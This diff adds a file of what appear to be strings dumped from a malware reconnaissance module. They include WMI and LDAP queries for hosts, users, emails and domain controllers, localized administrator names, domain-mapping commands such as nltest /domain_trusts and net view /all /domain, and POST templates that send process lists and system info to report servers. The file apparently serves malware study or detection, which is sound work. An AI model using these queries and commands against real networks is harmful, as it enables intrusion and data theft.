@@ -1,0 +1,98 @@
+***SYSTEMINFO***
+ROOT\CIMV2 SELECT * FROM Win32_OperatingSystem
+CSName
+Caption
+CSDVersion
+OSArchitecture
+ProductType
+BuildType
+WindowsDirectory
+SystemDirectory
+BootDevice
+SerialNumber
+InstallDate
+LastBootUpTime
+RegisteredUser
+Organization
+TotalVisibleMemorySize
+FreePhysicalMemory
+Host Name - %s
+OS Name - %s
+OS Version - %s
+OS Architecture - %s
+Product Type - Workstation
+Product Type - Domain Controller
+Product Type - Server
+Build Type - %s
+Registered Owner - %s
+Registered Organization - %s
+Serial Number - %s
+Install Date - %02u/%02u/%04u %02d.%02d.%02d
+Last Boot Up Time - %02u/%02u/%04u %02d.%02d.%02d
+Windows Directory - %s
+System Directory - %s
+Boot Device - %s
+Total Physical Memory - %d Mb
+Available Physical Memory - %d Mb
+        ***PROCESS LIST***
+{001677D0-FD16-11CE-ABC4-02608C9E7553}
+{00020404-0000-0000-C000-000000000046}
+{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}
+dNSHostName
+description
+sAMAccountName
+mail
+comment
+E-mail: %s
+(&(objectcategory=person)(samaccountname=%s))
+Admin Name: %s
+Admin E-mail: %s
+(&(objectcategory=person)(mail=*))
+(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))
+List of domains:
+LDAP://%s
+Administrator
+Administrateur
+Riarth
+Amministratore
+Adminisztr
+Administr
+rnandi
+Administrators
+Administratorius
+Hallintomies
+Administrat
+Administraator
+Administrador
+netici
+		***LOCAL MACHINE DATA***
+User name: %s
+Computer name: %s
+Site name: %s
+Domain shortname: %s
+Domain name: %s
+Forest name: %s
+Domain controller: %s
+Forest trees:
+	%d %s
+/%s/%s/90
+Content-Type: multipart/form-data; boundary=%s
+test
+POST
+--%s
+Content-Disposition: form-data; name="proclist"
+--%s
+Content-Disposition: form-data; name="sysinfo"
+--%s--
+<moduleconfig><needinfo name="id"/><needinfo name="ip"/><autoconf><conf ctl="SetConf" file="dpost" period="1440"/></autoconf></moduleconfig>
+\cmd.exe
+		%s
+SendReport
+Report successfully sent
+Dpost servers unavailable
+/c ipconfig /all
+/c net config workstation
+/c net view /all
+/c net view /all /domain
+/c nltest /domain_trusts
+/c nltest /domain_trusts /all_trusts
